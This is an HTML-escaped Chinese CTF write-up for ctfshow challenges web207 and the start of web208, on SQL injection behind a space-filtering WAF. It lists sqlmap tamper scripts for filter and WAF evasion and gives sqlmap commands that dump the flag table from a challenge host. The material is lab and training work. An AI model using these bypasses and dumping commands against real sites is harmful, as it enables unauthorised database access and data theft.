&lt;hr&gt;
&lt;h1 id=&#34;web207&#34;&gt;&lt;a href=&#34;#web207&#34; class=&#34;headerlink&#34; title=&#34;web207&#34;&gt;&lt;/a&gt;web207&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;--tamper 的初体验


查询语句
//拼接sql语句查找指定ID用户
$sql = &amp;quot;select id,username,pass from ctfshow_user where id = (&amp;#39;&amp;quot;.$id.&amp;quot;&amp;#39;) limit 0,1;&amp;quot;;


返回逻辑
//对传入的参数进行了过滤
  function waf($str)&amp;#123;
   return preg_match(&amp;#39;/ /&amp;#39;, $str);
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;--tamper&lt;/code&gt;&lt;/strong&gt; &amp;#x3D; “绕过 WAF &amp;#x2F; 过滤器的脚本集合”&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当目标网站对 SQL 注入语句做了 &lt;strong&gt;字符、关键字或正则过滤&lt;/strong&gt;，普通 payload 会被拦截&lt;/li&gt;
&lt;li&gt;sqlmap 提供 &lt;strong&gt;tamper 脚本&lt;/strong&gt;，可以对注入语句 &lt;strong&gt;进行编码、混淆或替换&lt;/strong&gt;，以绕过过滤&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;常用tamper脚本&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apostrophemask.py				 用utf8代替引号

equaltolike.py					 MSSQL * SQLite中like 代替等号

greatest.py						 MySQL中绕过过滤’&amp;gt;’ ,用GREATEST替换大于号

space2hash.py 				   	 空格替换为#号 随机字符串 以及换行符

space2comment.py				 用/**/代替空格

apostrophenullencode.py		     MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，									替换字符和双引号

halfversionedmorekeywords.py	 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论

space2morehash.py			 	 MySQL中空格替换为 #号 以及更多随机字符串 换行符

appendnullbyte.py			     Microsoft Access在有效负荷结束位置加载零字节字符编码

ifnull2ifisnull.py 				 MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤

space2mssqlblank.py 	 	 	 mssql空格替换为其它空符号

base64encode.py 				 用base64编码

space2mssqlhash.py			     mssql查询中替换空格

modsecurityversioned.py 		 mysql中过滤空格，包含完整的查询版本注释

space2mysqlblank.py 			 mysql中空格替换其它空白符号

between.py 						 MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * 										 PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&amp;gt;）

space2mysqldash.py 				 MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行								 （’ n’）

multiplespaces.py 			 	 围绕SQL关键字添加多个空格

space2plus.py 				 	 用+替换空格

bluecoat.py 					 MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 									然后替换=为like

nonrecursivereplacement.py 		 双重查询语句。取代predefined SQL关键字with表示suitable for替代

space2randomblank.py			 代替空格字符（“”）从一个随机的空白字符可选字符的有效集

sp_password.py 					 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾

chardoubleencode.py 			 双url编码(不处理以编码的)

unionalltounion.py 				 替换UNION ALL SELECT UNION SELECT

charencode.py 					 Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 									 10g，PostgreSQL 8.3, 8.4, 9.0url编码；

randomcase.py 					 Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 									 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写

unmagicquotes.py 				 宽字符绕过 GPC addslashes

randomcomments.py 				 用/**/分割sql关键字

charunicodeencode.py 			 ASP，ASP.NET中字符串 unicode 编码

securesphere.py 				 追加特制的字符串

versionedmorekeywords.py 		 MySQL &amp;gt;= 5.1.13注释绕过

halfversionedmorekeywords.py 	 MySQL &amp;lt; 5.1中关键字前加注释
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用 &lt;code&gt;space2comment&lt;/code&gt; 用&lt;code&gt;/**/&lt;/code&gt;代替空格&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --cookie=&amp;quot;PHPSESSID=abcd&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; --safe-url=&amp;quot;http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.show/api/getToken.php&amp;quot; --safe-freq=1 --tamper=space2comment -D ctfshow_web --tables
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827174848968.png&#34; alt=&#34;image-20250827174848968&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --cookie=&amp;quot;PHPSESSID=abcd&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; --safe-url=&amp;quot;http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.show/api/getToken.php&amp;quot; --safe-freq=1 --tamper=space2comment -D ctfshow_web -T ctfshow_flaxca --columns
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827180354679.png&#34; alt=&#34;image-20250827180354679&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --cookie=&amp;quot;PHPSESSID=abcd&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; --safe-url=&amp;quot;http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.show/api/getToken.php&amp;quot; --safe-freq=1 --tamper=space2comment -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250827180633985.png&#34; alt=&#34;image-20250827180633985&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web208&#34;&gt;&lt;a href=&#34;#web208&#34; class=&#34;headerlink&#34; title=&#34;web208&#34;&gt;&lt;/a&gt;web208&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;--tamper 的2体验


查询语句
//拼接sql语句查找指定ID用户
$sql = &amp;quot;select id,username,pass from ctfshow_user where id = (&amp;#39;&amp;quot;.$id.&amp;quot;&amp;#39;) limit 0,1;&amp;quot;;


返回逻辑
//对传入的参数进行了过滤
// $id = str_replace(&amp;#39;select&amp;#39;, &amp;#39;&amp;#39;, $id);
  function waf($str)&amp;#123;
   return preg_match(&amp;#39;/ /&amp;#39;, $str);
  &amp;#125;
